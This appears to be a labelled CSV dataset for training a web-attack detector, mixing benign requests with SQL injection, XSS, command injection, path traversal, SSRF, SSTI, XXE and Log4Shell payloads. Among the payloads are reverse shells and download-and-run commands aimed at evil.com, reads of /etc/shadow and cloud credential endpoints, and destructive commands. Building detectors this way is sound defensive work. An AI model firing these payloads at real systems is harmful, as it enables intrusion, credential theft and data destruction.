text,label,attack_type,severity
"1%27%20UNION%20ALL%20SELECT%20NULL,NULL,NULL--",1,sql_injection,high
User-Agent: %27%20HAVING%201=1--,1,sql_injection,high
X-Forwarded-For: 127.0.0.1%20|%20id,1,command_injection,critical
"POST /api/feedback body={{""message"":""green""}}",0,normal,none
GET /docs/web-development.html,0,normal,none
search query for size,0,normal,none
GET /images/green.png,0,normal,none
User-Agent: %3Cscript%3Ealert%281%29%3C/script%3E,1,xss,medium
"POST /api/data HTTP/1.1
Host: target.com

input=' UNION SELECT NULL,NULL,NULL--",1,sql_injection,high
X-Forwarded-For: %27%20OR%20%271%27=%271,1,sql_injection,high
"GET /page?id=<#assign ex=""freemarker.template.utility.Execute""?new()>${ex(""id"")} HTTP/1.1
Host: target.com",1,ssti,high
edit comment id=data-science,0,normal,none
Referer: http://target.com/?q=http://metadata.google.internal/computeMetadata/v1/,1,ssrf,high
"POST /api/orders body={{""item"":""red""}}",0,normal,none
"GET /search?input=' AND EXISTS(SELECT * FROM users)-- HTTP/1.1
Host: target.com",1,sql_injection,high
"POST /api/data HTTP/1.1
Host: target.com

input=1 UNION SELECT table_name FROM information_schema.tables",1,sql_injection,high
"POST /api/data HTTP/1.1
Host: target.com

input=127.0.0.1;%20ls",1,command_injection,critical
Referer: http://target.com/?q=%3Csvg%20onload=alert%28document.domain%29%3E,1,xss,medium
username=admin&password=admin123,1,brute_force,low
php://filter/convert.base64-encode/resource=/etc/passwd,1,path_traversal,medium
username=2&action=login,0,normal,none
"GET /search?input=file:///etc/passwd HTTP/1.1
Host: target.com",1,path_traversal,medium
search query for faq,0,normal,none
GET /blog/cloud-computing HTTP/1.1,0,normal,none
GET /search?q=javascript&page=1,0,normal,none
"GET /search?input=%27%20OR%20BENCHMARK%281000000,MD5%28%27a%27%29%29-- HTTP/1.1
Host: target.com",1,sql_injection,high
../../etc/passwd,1,path_traversal,medium
file:///c:/boot.ini,1,path_traversal,medium
"POST /api/data HTTP/1.1
Host: target.com

input=%3Cimg%20src=x%20onerror=alert%281%29%3E",1,xss,medium
User-Agent: <p onmouseover='alert(1)'>hover</p>,1,xss,medium
download file faq.pdf,0,normal,none
POST /api/cart add item=25,0,normal,none
"GET /page?id=..\..\..\windows\win.ini HTTP/1.1
Host: target.com",1,path_traversal,medium
User-Agent: %27%20OR%201=1%20LIMIT%201--,1,sql_injection,high
http://localhost/admin,1,ssrf,high
User-Agent: 1%27%20AND%20%28SELECT%20*%20FROM%20users%29%20%3E%200--,1,sql_injection,high
GET /category/summary-q3/items,0,normal,none
view page number invoice-2024,0,normal,none
X-Forwarded-For: %3Cp%20onmouseover=%27alert%281%29%27%3Ehover%3C/p%3E,1,xss,medium
User-Agent: login=admin&pass=admin,1,brute_force,low
"GET /search?input=%3Cdetails%20open%20ontoggle=alert%281%29%3E HTTP/1.1
Host: target.com",1,xss,medium
"POST /api/data HTTP/1.1
Host: target.com

input=;%20rm%20-rf%20/tmp/*",1,command_injection,critical
"1 AND (SELECT SUBSTRING(username,1,1) FROM users WHERE username='admin')='a'",1,sql_injection,high
"POST /api/data HTTP/1.1
Host: target.com

input=|%20nc%20evil.com%204444%20-e%20/bin/sh",1,command_injection,critical
User-Agent: 1' AND (SELECT * FROM users) > 0--,1,sql_injection,high
GET /blog/python HTTP/1.1,0,normal,none
User-Agent: javascript:alert%281%29,1,xss,medium
X-Forwarded-For: 1 UNION SELECT table_name FROM information_schema.tables,1,sql_injection,high
"POST /api/feedback body={{""message"":""products""}}",0,normal,none
User-Agent: Authorization:%20Basic%20cm9vdDpyb290,1,brute_force,low
X-Forwarded-For: ....//....//....//etc/passwd,1,path_traversal,medium
"POST /api/data HTTP/1.1
Host: target.com

input=1%27%20OR%201=1--",1,sql_injection,high
X-Forwarded-For: email=admin@admin.com&password=admin,1,brute_force,low
"GET /page?id=../../../../etc/shadow HTTP/1.1
Host: target.com",1,path_traversal,medium
GET /blog/web-development HTTP/1.1,0,normal,none
"GET /page?id=SELECT%20*%20FROM%20users%20WHERE%20id=1%20OR%201=1 HTTP/1.1
Host: target.com",1,sql_injection,high
sort items by cameras ascending,0,normal,none
"GET /search?input=../../../etc/passwd HTTP/1.1
Host: target.com",1,path_traversal,medium
"POST /api/data HTTP/1.1
Host: target.com

input=..%252f..%252f..%252fetc%252fpasswd",1,path_traversal,medium
Referer: http://target.com/?q=%3Caudio%20src=x%20onerror=alert%281%29%3E,1,xss,medium
"POST /api/data HTTP/1.1
Host: target.com

input=file:///c:/windows/win.ini",1,path_traversal,medium
"GET /search?input=username=user&password=user HTTP/1.1
Host: target.com",1,brute_force,low
%3Cscript%3Ealert%281%29%3C/script%3E,1,xss,medium
GET /category/smartphones/items,0,normal,none
"GET /page?id=${${::-j}ndi:ldap://evil.com/a} HTTP/1.1
Host: target.com",1,log4shell,critical
delete item id=john_doe,0,normal,none
Referer: http://target.com/?q=username=admin&password=123456,1,brute_force,low
edit comment id=march,0,normal,none
edit comment id=2024,0,normal,none
download file machine-learning.pdf,0,normal,none
"GET /page?id=&%20id HTTP/1.1
Host: target.com",1,command_injection,critical
%3Cmeta%20http-equiv=%27refresh%27%20content=%270;url=javascript:alert%281%29%27%3E,1,xss,medium
GET /products/home HTTP/1.1,0,normal,none
delete item id=february,0,normal,none
1%27%20OR%201=1--,1,sql_injection,high
load data from size,0,normal,none
%3Cform%20action=%27javascript:alert%281%29%27%3E%3Cinput%20type=submit%3E%3C/form%3E,1,xss,medium
Referer: http://target.com/?q=..\..\..\..\windows\system32\drivers\etc\hosts,1,path_traversal,medium
"GET /search?input=../../etc/passwd HTTP/1.1
Host: target.com",1,path_traversal,medium
Referer: http://target.com/?q=xmlns:xi=%22http://www.w3.org/2001/XInclude%22%3E%3Cxi:include%20parse=%22text%22%20href=%22file:///etc/passwd%22/%3E,1,xxe,high
Referer: http://target.com/?q=' OR '1'='1' /*,1,sql_injection,high
User-Agent: ;%20wget%20http://evil.com/shell.sh%20-O%20/tmp/shell.sh%20&&%20bash%20/tmp/shell.sh,1,command_injection,critical
"GET /page?id=$(ls -la) HTTP/1.1
Host: target.com",1,command_injection,critical
"GET /search?input=${${::-j}${::-n}${::-d}${::-i}:${::-r}${::-m}${::-i}://evil.com/a} HTTP/1.1
Host: target.com",1,log4shell,critical
"GET /search?input=%3Csvg%20onload=alert%28document.domain%29%3E HTTP/1.1
Host: target.com",1,xss,medium
User-Agent: username=admin&password=password123,1,brute_force,low
User-Agent: ;%20ls%20-la,1,command_injection,critical
load data from products,0,normal,none
"GET /search?input=%3Caudio%20src=x%20onerror=alert%281%29%3E HTTP/1.1
Host: target.com",1,xss,medium
User-Agent: expression%28alert%281%29%29,1,xss,medium
<audio src=x onerror=alert(1)>,1,xss,medium
"GET /page?id=%3Cbase%20href=%27javascript:alert%281%29//%27%3E%3Ca%20href=/%3Eclick%3C/a%3E HTTP/1.1
Host: target.com",1,xss,medium
X-Forwarded-For: %27%20OR%20%271%27=%271%27%20/*,1,sql_injection,high
"<!DOCTYPE foo [<!ENTITY xxe ""test""> <!ENTITY xxe2 ""&xxe;&xxe;&xxe;"">]>",1,xxe,high
"GET /page?id=${${upper:j}ndi:ldap://evil.com/a} HTTP/1.1
Host: target.com",1,log4shell,critical
"POST /api/data HTTP/1.1
Host: target.com

input=""><img src=x onerror=alert(1)>",1,xss,medium
X-Forwarded-For: ;%20curl%20http://evil.com/shell.sh%20|%20bash,1,command_injection,critical
http://127.0.0.1:3306,1,ssrf,high
GET /images/fr.png,0,normal,none
delete item id=size,0,normal,none
"GET /page?id=| nc evil.com 4444 -e /bin/sh HTTP/1.1
Host: target.com",1,command_injection,critical
X-Forwarded-For: %3CIMG%20SRC=javascript:alert%28%27XSS%27%29%3E,1,xss,medium
"POST /api/data HTTP/1.1
Host: target.com

input=http://169.254.169.254/latest/user-data",1,ssrf,high
"GET /search?input=id=1' AND '1'='1 HTTP/1.1
Host: target.com",1,sql_injection,high
POST /api/cart add item=order-12345,0,normal,none
X-Forwarded-For: expect://id,1,path_traversal,medium
"POST /api/data HTTP/1.1
Host: target.com

input=1%27;%20DROP%20TABLE%20users--",1,sql_injection,high
User-Agent: ../../../../var/log/apache2/access.log,1,path_traversal,medium
|%20ls%20-la,1,command_injection,critical
"GET /page?id=....\....\....\etc\passwd HTTP/1.1
Host: target.com",1,path_traversal,medium
User-Agent: %27%20OR%20SLEEP%285%29--,1,sql_injection,high
"GET /page?id=%3Cselect%20onchange=alert%281%29%3E%3Coption%3E1%3C/option%3E%3C/select%3E HTTP/1.1
Host: target.com",1,xss,medium
"POST /api/data HTTP/1.1
Host: target.com

input=;%20cat%20/etc/shadow",1,command_injection,critical
GET /blog/2025 HTTP/1.1,0,normal,none
User-Agent: username=admin&password=' OR '1'='1,1,sql_injection,high
"POST /api/data HTTP/1.1
Host: target.com

input=%27%20OR%20%271%27=%271%27--",1,sql_injection,high
Referer: http://target.com/?q=${self.module.cache.util.os.system%28%27id%27%29},1,ssti,high
POST /api/cart add item=txt,0,normal,none
"POST /api/orders body={{""item"":""tablets""}}",0,normal,none
"GET /search?input=<!DOCTYPE foo [<!ENTITY % xxe SYSTEM ""http://evil.com/evil.dtd""> %xxe;]> HTTP/1.1
Host: target.com",1,xxe,high
upload image photo_services.jpg,0,normal,none
view page number en,0,normal,none
User-Agent: ${jndi:ldaps://evil.com/a},1,log4shell,critical
"GET /search?input=%3C!DOCTYPE%20foo%20[%3C!ENTITY%20%%20xxe%20SYSTEM%20%22http://evil.com/evil.dtd%22%3E%20%xxe;]%3E HTTP/1.1
Host: target.com",1,xxe,high
POST /api/cart add item=smartphones,0,normal,none
"POST /api/data HTTP/1.1
Host: target.com

input=%3Cobject%20data=javascript:alert%281%29%3E",1,xss,medium
GET /images/home.png,0,normal,none
search query for products,0,normal,none
; env,1,command_injection,critical
User-Agent: '; EXEC xp_cmdshell('whoami')--,1,sql_injection,high
"GET /page?id=http://169.254.169.254/latest/meta-data/iam/security-credentials/ HTTP/1.1
Host: target.com",1,ssrf,high
%27%20OR%20%271%27=%271%27%20/*,1,sql_injection,high
GET /blog/100 HTTP/1.1,0,normal,none
X-Forwarded-For: User-Agent:%20${jndi:ldap://evil.com/a},1,log4shell,critical
"POST /api/data HTTP/1.1
Host: target.com

input=%3Cdiv%20style=%27background:url%28javascript:alert%281%29%29%27%3E",1,xss,medium
|%20cat%20/etc/passwd,1,command_injection,critical
Referer: http://target.com/?q=1%27%20ORDER%20BY%20100--,1,sql_injection,high
Referer: http://target.com/?q=1%27%20AND%20%28SELECT%20COUNT%28*%29%20FROM%20information_schema.tables%29%3E0--,1,sql_injection,high
"POST /api/data HTTP/1.1
Host: target.com

input=;%20rm%20-rf%20/tmp/*",1,command_injection,critical
Referer: http://target.com/?q=' OR 1=1/*,1,sql_injection,high
"GET /page?id=`cat%20/etc/passwd` HTTP/1.1
Host: target.com",1,command_injection,critical
X-Forwarded-For: Authorization:%20Basic%20cm9vdDpyb290,1,brute_force,low
sort items by 25 ascending,0,normal,none
GET /category/alice/items,0,normal,none
"POST /api/data HTTP/1.1
Host: target.com

input=1;%20EXEC%20xp_cmdshell%28%27dir%20c:\%27%29--",1,sql_injection,high
"content-type: application/json
body: {{""name"":""date""}}",0,normal,none
"GET /search?input=../../../etc/passwd HTTP/1.1
Host: target.com",1,path_traversal,medium
"GET /page?id=%3Cstyle%3E*{background:url%28%27javascript:alert%281%29%27%29}%3C/style%3E HTTP/1.1
Host: target.com",1,xss,medium
1%20AND%20%28SELECT%20*%20FROM%20%28SELECT%28SLEEP%285%29%29%29a%29--,1,sql_injection,high
X-Forwarded-For: http://169.254.169.254/latest/meta-data/iam/security-credentials/,1,ssrf,high
"POST /api/data HTTP/1.1
Host: target.com

input=1%20AND%20%28SELECT%20SUBSTRING%28username,1,1%29%20FROM%20users%20WHERE%20username=%27admin%27%29=%27a%27",1,sql_injection,high
X-Forwarded-For: %3Cbody%20onload=alert%281%29%3E,1,xss,medium
GET /docs/data-science.html,0,normal,none
"POST /api/data HTTP/1.1
Host: target.com

input=javascript:alert%281%29",1,xss,medium
sort items by bob ascending,0,normal,none
"content-type: application/json
body: {{""name"":""100""}}",0,normal,none
"xmlns:xi=""http://www.w3.org/2001/XInclude""><xi:include parse=""text"" href=""file:///etc/passwd""/>",1,xxe,high
"GET /search?input=http://spoofed.burpcollaborator.net HTTP/1.1
Host: target.com",1,ssrf,high
create new post title=100,0,normal,none
download file 25.pdf,0,normal,none
Referer: http://target.com/?q=%3Cscript%3Ealert%281%29%3C/script%3E,1,xss,medium
download file cameras.pdf,0,normal,none
"POST /api/data HTTP/1.1
Host: target.com

input=../../etc/passwd",1,path_traversal,medium
"POST /api/orders body={{""item"":""data-science""}}",0,normal,none
X-Forwarded-For: `env`,1,command_injection,critical
User-Agent: 1 UNION SELECT table_name FROM information_schema.tables,1,sql_injection,high
"POST /api/data HTTP/1.1
Host: target.com

input=1%27%20ORDER%20BY%201--",1,sql_injection,high
http://spoofed.burpcollaborator.net,1,ssrf,high
GET /api/status?service=mobile-apps,0,normal,none
;%20cat%20/etc/passwd,1,command_injection,critical
"GET /search?input=%3Ciframe%20onload=alert%281%29%3E HTTP/1.1
Host: target.com",1,xss,medium
User-Agent: 127.0.0.1; ls,1,command_injection,critical
GET /blog/fr HTTP/1.1,0,normal,none
username=postgres&password=postgres,1,brute_force,low
"POST /api/orders body={{""item"":""february""}}",0,normal,none
X-Forwarded-For: %3Cimg+src%3Dx+onerror%3Dalert%281%29%3E,1,xss,medium
X-Forwarded-For: ' UNION SELECT NULL--,1,sql_injection,high
view page number smartphones,0,normal,none
X-Forwarded-For: {{%27%27.__class__.__base__.__subclasses__%28%29}},1,ssti,high
"GET /page?id=%27;%20SHUTDOWN-- HTTP/1.1
Host: target.com",1,sql_injection,high
"GET /search?input=<svg onload=alert(1)> HTTP/1.1
Host: target.com",1,xss,medium
"POST /api/data HTTP/1.1
Host: target.com

input=<svg onload=alert(document.domain)>",1,xss,medium
"User-Agent: 1%27%20AND%20ASCII%28SUBSTRING%28%28SELECT%20password%20FROM%20users%20LIMIT%201%29,1,1%29%29%3E64--",1,sql_injection,high
Referer: http://target.com/?q=http://169.254.169.254/computeMetadata/v1/,1,ssrf,high
"GET /page?id=..././..././..././etc/passwd HTTP/1.1
Host: target.com",1,path_traversal,medium
"GET /page?id=user=admin&pwd=password HTTP/1.1
Host: target.com",1,brute_force,low
X-Forwarded-For: ;%20wget%20http://evil.com/shell.sh%20-O%20/tmp/shell.sh%20&&%20bash%20/tmp/shell.sh,1,command_injection,critical
User-Agent: http://127.0.0.1/admin,1,ssrf,high
"POST /api/data HTTP/1.1
Host: target.com

input=/etc/passwd%00",1,path_traversal,medium
"POST /api/data HTTP/1.1
Host: target.com

input=; ls -la",1,command_injection,critical
